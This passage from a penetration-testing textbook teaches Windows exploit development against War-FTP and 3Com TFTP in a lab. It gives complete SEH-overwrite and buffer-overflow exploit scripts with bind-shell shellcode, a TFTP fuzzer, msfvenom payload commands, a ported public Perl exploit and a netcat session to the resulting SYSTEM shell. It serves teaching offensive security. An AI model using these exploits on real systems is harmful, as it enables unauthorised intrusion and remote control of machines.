we need to load the value of ESP+8 (now in ESP after our two POP instructions) into EIP (the next memory address to be executed). Luckily, there‚Äôs 
an instruction for that, namely, the RET instruction. By design, RET takes the 
contents of the ESP register and loads them into EIP to be executed next. 
If we can find these three instructions, POP <some register>, POP <some 
register>, RET (often abbreviated by exploit developers as POP POP RET), we 
should be able to redirect the program‚Äôs execution by overwriting SEH with 
the memory address of the first POP instruction. The contents of ESP will 
then be popped into the register indicated by the instruction. We don‚Äôt particularly care which register gets the honor of holding the popped-off data, 
as long as it‚Äôs not ESP itself. We care only about burning things off the stack 
until we get to ESP+8. 
Next, the second POP instruction is executed. Now ESP points to the 
original ESP+8. Then, the RET instruction is executed, and ESP (ESP+8 
when the SEH was executed) is loaded into EIP. Recall from the previous 
section that ESP+8 held a memory address that points to byte 569 of our 
attacker-controlled string. 
N ote As with JMP ESP, it is not a hard requirement that we find POP POP RET instructions.
Logical equivalents, such as adding eight bytes to ESP followed by a RET and others, 
would work just as well.
Though this technique is a little more complicated, it‚Äôs similar to the 
saved return pointer buffer overflow exercise we completed in Chapter 17. 
We are hijacking the program‚Äôs execution and redirecting it to our shellcode. Now we need to find an instance of POP POP RET instructions in WarFTP or its executable modules. 
Saf
As SEH overwrite attacks have become prevalent, Microsoft has come 
up with ways to stop them from working. One such example is SafeSEH. 
Programs compiled with SafeSEH record the memory locations that will be 
used for structured exception handling, which means that attempts to redirect execution to a memory location with POP POP RET instructions will fail 
the SafeSEH check. 
It‚Äôs important to realize that even if DLLs in Windows XP SP2 and later 
are compiled with SafeSEH, third-party software doesn‚Äôt have to implement 
this mitigation technique. If War-FTP or any of its custom DLLs do not use 
SafeSEH, we may not have to deal with this check. 
Mona will determine which modules are not compiled with SafeSEH 
in the process of finding the POP POP RET instructions when we use the command !mona seh, as shown in Figure 18-14. 
Structured Exception Handler Overwrites 413
Figure 18-14: Running the SEH command in Mona 
The results of !mona seh are written to C:\logs\war-ftpd\seh.txt, as shown in 
part here.
0x5f401440 : pop edi # pop ebx # ret 0x04 | asciiprint,ascii {PAGE_EXECUTE_
READ} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False, 
v4.2.6256 (C:\Documents and Settings\georgia\Desktop\MFC42.DLL)
0x5f4021bf : pop ebx # pop ebp # ret 0x04 | {PAGE_EXECUTE_READ} [MFC42.DLL] 
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\Documents 
and Settings\georgia\Desktop\MFC42.DLL)
0x5f4580ca : pop ebx # pop ebp # ret 0x04 | {PAGE_EXECUTE_READ} [MFC42.DLL] 
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\Documents 
and Settings\georgia\Desktop\MFC42.DLL)
0x004012f2 : pop edi # pop esi # ret 0x04 | startnull {PAGE_EXECUTE_READ} 
[war-ftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.6.5.0 
(C:\Documents and Settings\georgia\Desktop\war-ftpd.exe)
As you can see from the output, the only modules without SafeSEH 
are the War-FTP executable itself and a War-FTP-included DLL called 
MFC42.dll. We need to choose an instance of POP POP RET (or a logical 
equivalent) from Mona‚Äôs output that avoids the four bad characters discussed in Chapter 17 (\x00, \x40, \x0a, \x0d). (To have Mona automatically 
exclude entries with bad characters during the search, enter !mona seh -cpb 
"\x00\x40\x0a\x0d". One such address is 5F4580CA. The instructions are POP EBX, 
POP EBP, RET. Again, we don‚Äôt care where the instructions are stored, as long 
as we POP two entries off the stack. If we overwrite SEH with the address 
5F4580CA, these instructions will be executed, and we will redirect execution 
to our attack string. 
414 Chapter 18
Before we move on, set a breakpoint at 5F4580CA with bp 0x5F4580CA, as 
shown in Figure 18-15.
Figure 18-15: Breakpoint at the POP POP RET
Replace the four Cs in the previous exploit with the POP POP RET memory 
address in little-endian format, as shown in Listing 18-4. 
#!/usr/bin/python
import socket
buffer = "A" * 569 + "B" * 4 + "\xCA\x80\x45\x5F" + "D" * 573
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-4: Replacing the SEH overwrite with POP POP RET
Now run the exploit again. As you can see in Figure 18-16, the program 
crashes again, and, as expected, SEH is overwritten with 5F4580CA.
Structured Exception Handler Overwrites 415
Figure 18-16: SEH overwritten with a POP POP RET address
Type shift-F9 to let the program pass the overwritten exception handler. As expected, we hit our breakpoint, as shown in Figure 18-17.
Figure 18-17: We hit our breakpoint. 
416 Chapter 18
The CPU pane (top left) shows that the next instructions to be executed are the POP POP RET. Press F7 to step through the instructions one at 
a time, and watch what happens to the stack (bottom right) as you do. You 
will see ESP move down to a higher address as we execute the POP instructions. As you can see in Figure 18-18, when we execute the RET instruction 
we end up in our attack string, at the pointer to the NSEH record, which is 
currently filled with four Bs. 
Figure 18-18: Execution is redirected to your attack string. 
We have solved our first problem: We have redirected the program‚Äôs 
execution to our attack string. Unfortunately, as we can see in Figure 18-18, 
we only have four useable bytes before we run into our SEH overwrite 
address, 5F4580CA. We have a long string of Ds after the SEH address, but 
currently we are stuck with only four bytes to work with. We won‚Äôt be able 
to do much with only four bytes of shellcode. 
Using a Short Ju
We need to somehow bypass the return address and get to our long string 
of Ds, which has plenty of space for our final shellcode. We can use the short 
jump assembly instruction to move EIP a short distance. This method is ideal 
for our purposes because we need to jump over the four bytes of the SEH 
overwrite. 
The hexadecimal representation of a short jump is \xEB <length to jump>. 
Padding the short jump instruction \xEB <length to jump> with two bytes 
to take up all four bytes before the SEH overwrite, we can jump forward 
six bytes over the padding and the SEH overwrite. 
Structured Exception Handler Overwrites 417
Edit the attack string to include a short jump, as shown in Listing 18-5.
#!/usr/bin/python
import socket
buffer = "A" * 569 + "\xEB\x06" + "B" * 2 + "\xCA\x80\x45\x5F" + "D" * 570
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-5: Adding a short jump
As shown in Listing 18-5, this time we replace the NSEH (previously 
four Bs) with "\xEB\x06" + "B" * 2. Reset your breakpoint at the POP POP RET
before running the exploit again, and when you hit the breakpoint, step 
through the program line by line (F7) to see what is happening. Now after 
the POP POP RET we have a six-byte short jump, as shown in Figure 18-19. 
Figure 18-19: Execution is redirected to the short jump.
Now press F7 to execute the short jump. As shown in Figure 18-20, the 
short jump successfully bypasses the SEH overwrite address and redirects 
execution to the rest of our attack string (Ds).
418 Chapter 18
Figure 18-20: The short jump gets us past the SEH overwrite. 
Choosing a Payload
We have now redirected execution a second time, to a longer part of our 
controlled memory‚Äîan ideal place for our shellcode. Now to choose a payload and generate it with Msfvenom, as shown here. 
root@kali:~# msfvenom -p windows/shell_bind_tcp -s 573 -b '\x00\x40\x0a\x0d'
[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
buf = 
"\xbe\xa5\xfd\x18\xa6\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9" +
--snip--
Remember to tell Msfvenom to use a maximum size of 573 bytes and 
exclude our bad characters for the FTP username. (Again, you might be 
able to go a little bit longer, but our original exception occurs because we 
are writing off the end of the stack. We want to make sure all of our shellcode is executed.)Now add the shellcode to our exploit in place of the Ds. 
To make the exploit long enough to trigger the SEH overwrite (instead of 
the saved return pointer overwrite we saw in Chapter 17), pad the exploit 
string out to 1,150 characters with Ds. The finished exploit is shown in 
Listing 18-6. Our shellcode goes directly after our SEH overwrite. (In this 
example, we again use a Windows bind shell.)
#!/usr/bin/python
import socket
shellcode = ("\xbe\xa5\xfd\x18\xa6\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9" +
"\xb1\x56\x31\x77\x13\x83\xc7\x04\x03\x77\xaa\x1f\xed\x5a" +
"\x5c\x56\x0e\xa3\x9c\x09\x86\x46\xad\x1b\xfc\x03\x9f\xab" +
Structured Exception Handler Overwrites 419
"\x76\x41\x13\x47\xda\x72\xa0\x25\xf3\x75\x01\x83\x25\xbb" +
"\x92\x25\xea\x17\x50\x27\x96\x65\x84\x87\xa7\xa5\xd9\xc6" +
"\xe0\xd8\x11\x9a\xb9\x97\x83\x0b\xcd\xea\x1f\x2d\x01\x61" +
"\x1f\x55\x24\xb6\xeb\xef\x27\xe7\x43\x7b\x6f\x1f\xe8\x23" +
"\x50\x1e\x3d\x30\xac\x69\x4a\x83\x46\x68\x9a\xdd\xa7\x5a" +
--snip--
buffer = "A" * 569 + "\xEB\x06" + "B" * 2 + "\xCA\x80\x45\x5F" + shellcode + "B" * 205
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.close()
Listing 18-6: The finished SEH overwrite exploit 
When War-FTP is attached to Immunity Debugger, we have to manually 
tell the debugger to pass SEH to the program. When we run War-FTP without a debugger and an error is encountered, execution is automatically passed 
to SEH, executing POP POP RET, the short jump, and finally our shellcode. 
Summary
We have successfully built an SEH overwrite exploit for War-FTP. Though 
War-FTP allowed us to exploit the buffer overflow vulnerability by directly 
overwriting a return address or SEH, some vulnerable programs will not 
crash in a way that will allow you to control EIP but will allow you to overwrite SEH. In such cases, knowing the steps to exploit this sort of crash is 
paramount to creating a working exploit. Due to the way structured exception handlers work, you can count on NSEH being at ESP+8 every time 
you encounter this type of crash. When you overwrite SEH, you will find 
the pointer to the next SEH record at ESP+8. After executing a POP POP RET
series of instructions from a module that is not compiled with SafeSEH, 
you will need to execute a short jump to get to your shellcode in the attack 
string. If you continue in exploit development, you may run into another 
challenge where \xEB is a bad character, so you will need to find other ways 
of performing a jump.
In the next chapter we will finish up our study of the basics of exploit 
development with a few odds and ends, such as first discovering a crash 
using a technique called fuzzing, porting public exploit code to meet our 
needs, and writing our own Metasploit modules. 

19
F uzzing, PortingE x ploit s
a n M etasplot M od
In this chapter, we will review a few more basic exploit 
development techniques. We will look at using a technique called fuzzing to find potential exploits in vulnerable programs. We will also cover working with public 
exploit code and safely porting it to meet our needs, as 
well the basics of building our own Metasploit modules. 
Finally, we will discuss some of the exploitation mitigation techniques that our targets may have in place.
Fuzzing Programs 
In Chapter 17, we exploited War-FTP version 1.65‚Äôs Username field buffer 
overflow with a 1,100-byte exploit string. The natural question is, how did 
we know that 1,100 As in the Username field would crash the program, and, 
more importantly, how did security researchers find this vulnerability for 
422 Chapter 19
the first time? In some cases, source code for programs is publicly available, so a researcher looking for vulnerabilities need only be well versed in 
secure coding practices. In other cases, we can use a popular method called 
fuzzing to send various inputs to a program, hoping that something strange 
will happen.
Finding Bugs with Code Review
In Chapter 16, we used a short Linux program to illustrate a buffer overflow 
vulnerability. When auditing the source code of this program (as shown in 
Listing 19-1), we see the strcpy function u. As discussed in that chapter, this 
function does no bounds checking and may be a security risk. 
#include <string.h>
#include <stdio.h>
void overflowed() { 
 printf("%s\n", "Execution Hijacked");
}
void function(char *str){
 char buffer[5];
 strcpy(buffer, str); u
}
void main(int argc, char *argv[])
{
 function(argv[1]); v
 printf("%s\n", "Executed normally");
}
Listing 19-1: Vulnerable C code 
Reading through this source code, we see that user input (the first program argument) is passed to function v. The user input is then copied into 
a five-character string called buffer using strpy u. As we saw in Chapter 16, 
we can exploit this behavior to create a stack-based buffer overflow. 
Fuzzing a Trivial FTP Server
When we don‚Äôt have access to a program‚Äôs source code, we have to use other 
methods to find potentially exploitable security issues. We can use fuzzing 
to send various inputs to the program that the developer never intended 
the code to process. If we can find input that will manipulate memory in a 
controllable way, we may be able to exploit the program. 
In Chapter 17, when exploiting War-FTP 1.65, we first made the program crash by sending 1,100 As in the Username field. Once we determined 
that EIP contained four As, as well as a long string of As from the ESP register, we concluded that this issue was exploitable and proceeded to write a 
working stack-based buffer overflow exploit. In the following example, we 
start a step earlier and use fuzzing to determine how many As we need to 
send to a program in order to crash it. 
Fuzzing, Porting Exploits, and Metasploit Modules 423
We can use fuzzing techniques to trigger crashes, which we can 
use to build exploits. Let‚Äôs look at an example of fuzzing a Trivial FTP 
(TFTP) server to find an exploitable vulnerability. We‚Äôll use the 3Com 
TFTP server version 2.0.1, which we found on our Windows XP system 
during post exploitation. 
TFTP runs by default on UDP port 69. Because it is connectionless, we 
will need to know the syntax for TFTP communication to send UDP packets that the TFTP software will attempt to process. According to TFTP‚Äôs 
Request for Comment (RFC) page, a proper TFTP packet is in the format 
shown in Listing 19-2. To get TFTP to respond to us, we need to follow this 
specification. 
 2 bytes string 1 byte string 1 byte 
------------------------------------------------
| Opcode | Filename | 0 | Mode | 0 |
------------------------------------------------
Listing 19-2: TFTP packet format 
When considering stack-based buffer overflow attacks, look for places 
where the user controls the size and content of the input. If we can send 
input that technically meets the TFTP specification but which contains input 
that the code was not designed to process, we may be able to trigger a stackbased buffer overflow vulnerability. In the case of this TFTP server, the first 
field, Opcode, is always two bytes long and includes one of the following 
strings:
Opcode Operati
01 Read request (RRQ)
02 Write request (WRQ)
03 Data (DATA)
04 Acknowledgment (ACK)
05 Error (ERROR)
However, we can control the Filename field. In a real TFTP request, 
this is where we would tell the server the filename we want to read, write, 
and so on. The length is variable and the contents of the string are user 
controlled, so this may be a good place to look for stack-based buffer overflow vulnerabilities. For example, perhaps the author of the code was not 
expecting anyone to enter a filename that is 1,000 characters long. After all, 
who would want to type in a 1,000-character filename? 
The next field is a null byte, which signifies the end of the filename. We 
can‚Äôt control this field, but we can control the fourth field, Mode, which is 
a user-controlled variable string. According to the RFC, TFTP‚Äôs supported 
modes include netascii, octet, and mail. This is an ideal place for us to fuzz, 
because developers are expecting only eight characters or less for this field. 
The TFTP packet ends with a null byte to signify the end of the Mode. 
424 Chapter 19
Attempting a Crash
For our fuzzing exercise, we will craft a succession of legitimate TFTP packets with bogus and increasingly long input in the Mode field. If the TFTP 
processes the packets correctly, it should say the Mode is unrecognized and 
stop processing the packet. Perhaps if we can trigger a stack-based buffer 
overflow vulnerability, the results will be different, and we can cause the program to crash. To do this, we will again write a simple Python program.
Instead of setting our buffer variable to a string of 1,100 As, as in the 
War-FTP exploitation examples in Chapters 17 and 18, we‚Äôll create an array 
of strings of variable length in Listing 19-3.
#!/usr/bin/python 
import socket
bufferarray = ["A"*100] u
addition = 200
while len(bufferarray) <= 50: ÔÇç
 bufferarray.append("A"*addition) w
 addition += 100
for value in bufferarray: x
 tftppacket = "\x00\x02" + "Georgia" + "\x00" + value + "\x00" y
 print "Fuzzing with length " + str(len(value))
 s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM) z
 s.sendto(tftppacket,('192.168.20.10',69))
 response = s.recvfrom(2048)
 print response
Listing 19-3: A simple TFTP fuzzing program 
The first entry in the array will be a string of 100 As u. But before we 
send any packets to the TFTP server, let‚Äôs create the rest of the fuzzing 
strings and append them to our array by adding new fuzzing strings in 
increments of 100. Using a while loop, we will append progressively longer strings to the array until it is 50 elements long v. Each time we cycle 
through the while loop, a new element will be appended to the array w. 
After we have created our fuzzing strings and the while loop exits, we will 
enter a for loop ÔÅ∏, which will grab each element of the array in turn and
send it within the Mode field of a legitimate TFTP packet y. 
Our packet meets the specifications from the TFTP RFC. We have used 
the mode 02 (write request) and the filename Georgia. Our string of As from 
the array are put into the Mode field. Hopefully, one of our increasingly 
long strings will cause a crash. 
Setting up our network socket is a little different from what we learned 
in the previous chapter when attacking FTP in Python. Because TFTP is a 
UDP protocol, we need to set up a UDP socket as opposed to a TCP socket, 
so the syntax is slightly different z. Save the Python code as tftpfuzzer, and 
make it executable. 
Before we start sending fuzzing packets, switch back to your Windows 
XP machine and attach to the 3CTftpSvc process with Immunity Debugger, 
as shown in Figure 19-1. This will allow us to view the contents of memory 
Fuzzing, Porting Exploits, and Metasploit Modules 425
if we cause a crash to verify whether we have gained control of EIP. (Don‚Äôt 
forget to tell the program to continue running by clicking the play button 
at the top of the Immunity Debugger window.)
Figure 19-1: Attaching Immunity Debugger to the 3Com TFTP server
Now, in Listing 19-4, we run the TFTP fuzzer program we created in 
Listing 19-3. 
root@kali:~# ./tftpfuzzer
Fuzzing with length100
('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00',u ('192.168.20.10', 4484))
Fuzzing with length 200
('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00', ('192.168.20.10', 4485))
Fuzzing with length 300
('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00', ('192.168.20.10', 4486))
Fuzzing with length 400
('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00', ('192.168.20.10', 4487))
426 Chapter 19
Fuzzing with length 500
('\x00\x05\x00\x04Unk\x00', ('192.168.20.10', 4488))
Fuzzing with length 600 v
Listing 19-4: Fuzzing 3Com TFTP
As the program runs through the successive strings of As in the Mode 
field, the TFTP server replies that it doesn‚Äôt know that transport mode u. 
When the fuzzing program attempts to fuzz with a length of 600, it receives 
no response from the TFTP server v, which leads us to believe that a transport mode of 500 As crashed the server, such that it could not respond to us 
when we sent over 600 As. 
Looking back at the 3Com TFTP server in Immunity Debugger 
(Figure 19-2), we see that it has crashed with 41414141 in EIP. Also note the 
short string of As in the register ESP and the much longer string of As in the 
register ESI. It seems that by sending over a string of 500 characters in the 
Mode field, we can control execution and the contents of some memory registers: an ideal situation for writing a stack-based buffer overflow exploit. 
Figure 19-2: 3Com TFTP has crashed.
Using the techniques learned in the previous chapter when exploiting 
War-FTP, see if you can develop a working exploit for the 3Com TFTP 2.0.1 
without help from the text. In this case, the saved return pointer overwrite 
is at the end of the exploit string, and the shellcode in ESI will be earlier in 
the exploit string. (You‚Äôll find a completed Python exploit for this exercise 
in ‚ÄúWriting Metasploit Modules‚Äù on page 432. Refer to that code if you get 
stuck.)
To restart 3Com TFTP after a crash, browse to C:\Windows, open 
3CTftpSvcCtrl, and click Start Service, as shown in Figure 19-3. Then 
reattach to the new process in Immunity Debugger.
Fuzzing, Porting Exploits, and Metasploit Modules 427
Figure 19-3: 3Com TFTP Service Control dialog
Porting Public Exploits to Meet Your Ne
Sometimes you may find an exploitable vulnerability on your pentest, but 
there is no Metasploit module available to exploit it. While the Metasploit 
team and contributing module writers from the community do an excellent 
job of keeping Metasploit up-to-date with current threats, not every known 
exploit on the Internet has been ported to the framework. 
We can attempt to develop a working exploit by downloading the target 
software and developing a working exploit, but that approach is not always 
feasible. The software in question may come with a license fee so expensive 
that you would end up losing money on the pentest, or it may not be available from the vendor or elsewhere. In addition, your pentest may have a 
limited time frame, and so you would be better off looking for additional 
vulnerabilities in the environment rather than spending significant time on 
custom-exploit development. 
One way to develop your own working exploits is to use publicly available 
exploits as a base and port them to your environment. Even if a vulnerability lacks a corresponding Metasploit module, you may be able to find proofof-concept exploit code on a website like Exploit Database (http://www
.exploit-db.com/) or SecurityFocus (http://www.securityfocus.com/). Although 
public exploit code should always be used with caution (not everything 
online does what it says it does), with some due diligence, we can use public 
exploit code safely. 
Let‚Äôs start with a public exploit for the 3Com TFTP 2.0.1 long transport mode vulnerability from Exploit Database, found online at http://www
.exploit-db.com/exploits/3388/ and shown in Listing 19-5. 
#!/usr/bin/perl ‚Äìw u
#===============================================================
# 3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit
# By Umesh Wanve (umesh_345@yahoo.com)
#=============================================================== 
# Credits : Liu Qixu is credited with the discovery of this vulnerability.
428 Chapter 19
# Reference : http://www.securityfocus.com/bid/21301
# Date : 27-02-2007
# Tested on Windows 2000 SP4 Server English v
# Windows 2000 SP4 Professional English
# You can replace shellcode with your favourite one :
# Buffer overflow exists in transporting mode name of TFTP server.
# So here you go.
# Buffer = "\x00\x02" + "filename" + "\x00" + nop sled + Shellcode + JUMP + "\x00";
# This was written for educational purpose. Use it at your own risk. Author will not be 
# responsible for any damage.
#===============================================================
use IO::Socket;
if(!($ARGV[1]))
{
 print "\n3COM Tftp long transport name exploit\n";
 print "\tCoded by Umesh wanve\n\n";
 print "Use: 3com_tftp.pl <host> <port>\n\n";
 exit;
}
$target = IO::Socket::INET->new(Proto=>'udp',
 PeerAddr=>$ARGV[0],
 PeerPort=>$ARGV[1])
 or die "Cannot connect to $ARGV[0] on port $ARGV[1]";
# win32_bind - EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
my($shellcode)= w
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x48".
"\xc8\xb3\x54\x83\xeb\xfc\xe2\xf4\xb4\xa2\x58\x19\xa0\x31\x4c\xab".
"\xb7\xa8\x38\x38\x6c\xec\x38\x11\x74\x43\xcf\x51\x30\xc9\x5c\xdf".
--snip--
"\xc3\x9f\x4f\xd7\x8c\xac\x4c\x82\x1a\x37\x63\x3c\xb8\x42\xb7\x0b".
"\x1b\x37\x65\xab\x98\xc8\xb3\x54";
print "++ Building Malicious Packet .....\n";
$nop="\x90" x 129; 
$jmp_2000 = "\x0e\x08\xe5\x77";ÔÅ∏# jmp esi user32.dll windows 2000 sp4 englis
$exploit = "\x00\x02";ÔÅπ #write request (header
$exploit=$exploit."A"; #file name 
$exploit=$exploit."\x00"; #Start of transporting name
$exploit=$exploit.$nop;ÔÅ∫ #nop sled to land into shellcode
$exploit=$exploit.$shellcode;ÔÅª #our Hell code
$exploit=$exploit.$jmp_2000;ÔÅº #jump to shellcode
$exploit=$exploit."\x00"; #end of TS mode name
print $target $exploit; #Attack on victim
print "++ Exploit packet sent ...\n";
print "++ Done.\n";
print "++ Telnet to 4444 on victim's machine ....\n";
sleep(2);
close($target);
exit;
#----------------------------------------------------------------------------------
# milw0rm.com [2007-02-28]
Listing 19-5: Public exploit for 3Com TFTP 
Fuzzing, Porting Exploits, and Metasploit Modules 429
This exploit is written in Perl u. To use public exploits, you will need basic 
reading knowledge in a number of languages. Additionally, this exploit targets Windows 2000 SP4 v, whereas our target is Windows XP SP3. We will 
need to make some changes to port this exploit to our platform. 
The shellcode included with this exploit claims to have been generated 
using Metasploit and to open a bind shell on port 4444 w. 
N ote No offense intended to the original author of this exploit, but in a public exploit,
always be wary of anything you can‚Äôt read. Additionally, be aware that the included 
shellcode may not work for your environment. For example, it may be a reverse shell 
headed to a static IP address and port. Therefore, it is good practice to use Msfvenom 
to generate new, trustworthy shellcode before running any public exploit. 
Reading through the exploit, we see that the author creates a TFTP 
packet similar to the one we created in our fuzzing example earlier in the 
chapter ÔÅπ. The Mode field is filled with a NOP sled of 129 characters ÔÅ∫
344 bytes of shellcode ÔÅª, and the four-byte return addressÔÅº (in this case, a JM
ESI instruction) to redirect execution to the attacker-controlled ESI register ÔÅ∏.
N ote A NOP sled is a series of no operating instructions (\x90 in hex) that do nothing and
move on. They are typically used to pad exploits. Exploit developers can just redirect 
execution to somewhere in the NOP sled, and execution will just ‚Äúslide‚Äù down the NOP 
sled, doing nothing, until it reaches the shellcode. However, we have learned that we 
can be more precise with our exploits, and we usually don‚Äôt need NOP sleds at all. 
The command for the variable $jmp_2000  tells us that the exploit uses
a JMP ESI instruction in USER32.dll on Windows 2000 SP4 English. 
Finding a Return Address 
Because we are using a different platform, the memory location (0x77E5080E) 
of this JMP ESI instruction may be different. USER32.dll is a component of 
the Windows operating system. Windows XP does not use ASLR, discussed 
later in this chapter, so USER32.dll is loaded into the same memory location 
on all Windows XP SP3 English platforms. 
We have taken advantage of static DLL locations in our previous exploit 
exercises. We need not have a copy of 3Com TFTP running to find the 
memory locations of instructions in Windows components. For example, 
as shown in Figure 19-4, from debugging War-FTP, we can search for a JMP 
ESI instruction in USER32.dll. (It is a good idea to stick with the DLL noted 
in the original exploit if we don‚Äôt have a copy of the program. We can‚Äôt be 
sure the program loads MSVCRT.dll, for example.)
Of course, in our case, we have 3Com TFTP locally, but if we didn‚Äôt 
have access to the app, we could use Mona to look for JMP instructions inside 
a specific module. For example, we could look for instances of JMP ESI (or 
the equivalent) with the command !mona jmp -r esi -m user32, as shown in 
Figure 19-4. 
430 Chapter 19
Figure 19-4: Finding JMP ESI instructions in USER32.dl
And we find a JMP ESI instruction at the memory address 7E45AE4E in 
USER32.dll on Windows XP SP3. If we change the jmp_2000 variable to this 
value in little-endian format, this exploit should work for our platform. 
$jmp_2000 = "\x4E\xAE\x45\x7E";
Replacing Shellcode 
As noted earlier, we also need to replace the shellcode with code generated 
by Msfvenom. We can use a bind shell or any Windows payload that will fit 
in 344 + 129 bytes (the included shellcode plus the NOP sled). The only bad 
character we need to avoid this time is the null byte. Tell Msfvenom to output the payload in Perl format so we can easily add it to our exploit.
root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00' -s 473 -f perl
Editing the Exploit 
Our generated shellcode from Msfvenom is 368 bytes, whereas the original 
shellcode in the public exploit was 344 bytes. Now make the changes to 
the original exploit code shown in Listing 19-6. We delete the NOP sled 
and pad our exploit string with 105 bytes after the shellcode, so our return 
address still ends up hijacking EIP. 
Fuzzing, Porting Exploits, and Metasploit Modules 431
#!/usr/bin/perl -w
#===============================================================
# 3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit
# By Umesh Wanve (umesh_345@yahoo.com)
#=============================================================== 
# Credits : Liu Qixu is credited with the discovery of this vulnerability.
# Reference : http://www.securityfocus.com/bid/21301
# Date : 27-02-2007
# Tested on Windows XP SP3
# You can replace shellcode with your favourite one :
# Buffer overflow exists in transporting mode name of TFTP server.
# So here you go.
# Buffer = "\x00\x02" + "filename" + "\x00" + nop sled + Shellcode + JUMP + "\x00";
# This was written for educational purpose. Use it at your own risk. Author will not be 
responsible for any damage.
#===============================================================
use IO::Socket;
if(!($ARGV[1]))
{
 print "\n3COM Tftp long transport name exploit\n";
 print "\tCoded by Umesh wanve\n\n";
 print "Use: 3com_tftp.pl <host> <port>\n\n";
 exit;
}
$target = IO::Socket::INET->new(Proto=>'udp',
 PeerAddr=>$ARGV[0],
 PeerPort=>$ARGV[1])
 or die "Cannot connect to $ARGV[0] on port $ARGV[1]";
my($shellcode) = 
"\xda\xc5\xd9\x74\x24\xf4\x5f\xb8\xd4\x9d\x5d\x7a\x29\xc9" .
--snip--
"\x27\x92\x07\x7e";
print "++ Building Malicious Packet .....\n";
$padding="A" x 105; 
$jmp_xp = "\x4E\xAE\x45\x7E";ÔÅ∑# jmp esi user32.dll windows xp sp3 englis
$exploit = "\x00\x02"; #write request (header)
$exploit=$exploit."A"; #file name 
$exploit=$exploit."\x00"; #Start of transporting name
$exploit=$exploit.$shellcode; #shellcode 
$exploit=$exploit.$padding; #padding
$exploit=$exploit.$jmp_xp; #jump to shellcode
$exploit=$exploit."\x00"; #end of TS mode name
print $target $exploit; #Attack on victim
print "++ Exploit packet sent ...\n";
print "++ Done.\n";
print "++ Telnet to 4444 on victim's machine ....\n";
sleep(2);
close($target);
exit;
#----------------------------------------------------------------------------------------------
# milw0rm.com [2007-02-28]
Listing 19-6: The ported exploit 
432 Chapter 19
Our ported exploit will look like Listing 19-6, with the shellcode ÔÅµ,
padding ÔÅ∂, and return addressÔÅ∑ adjusted to meet our needs
If you‚Äôve done everything correctly, when you run the ported exploit, a 
bind shell with System privileges will open on TCP port 4444, as shown in 
Listing 19-7.
root@kali:~# ./exploitdbexploit.pl 192.168.20.10 69
++ Building Malicious Packet .....
++ Exploit packet sent ...
++ Done.
++ Telnet to 4444 on victim's machine ....
root@kali:~# nc 192.168.20.10 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
Listing 19-7: Running the ported exploit 
Writing Metasploit Modul
Throughout this book we have leveraged many Metasploit modules for 
information gathering, exploitation, post exploitation, and so on. As new 
